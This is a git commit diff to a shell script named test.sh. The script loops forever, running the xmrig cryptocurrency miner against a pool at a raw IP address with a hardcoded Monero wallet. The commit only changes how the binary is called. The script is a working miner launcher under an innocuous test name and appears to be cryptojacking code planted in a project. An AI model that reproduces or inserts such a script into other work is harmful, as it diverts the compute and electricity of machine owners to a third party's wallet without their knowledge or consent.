a300da4c2c8e9940ee04337e37bdeee71ef6a157
Adam Espitia <emada.adame@gmail.com>
2023-04-02 11:14:07 -0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 while [ true ]
 do
-  ./xmrig -o 44.196.193.227:10128 -u 43dKXP2q8cK3y9HgQu6YFCCgQmAxdUf7zUjRqUo7oz7dCaqMVnjPoBV1q4tRqgPL1U8XRAJS1oKipgUppHcMfVATPhob9EB
+  xmrig -o 44.196.193.227:10128 -u 43dKXP2q8cK3y9HgQu6YFCCgQmAxdUf7zUjRqUo7oz7dCaqMVnjPoBV1q4tRqgPL1U8XRAJS1oKipgUppHcMfVATPhob9EB
 done
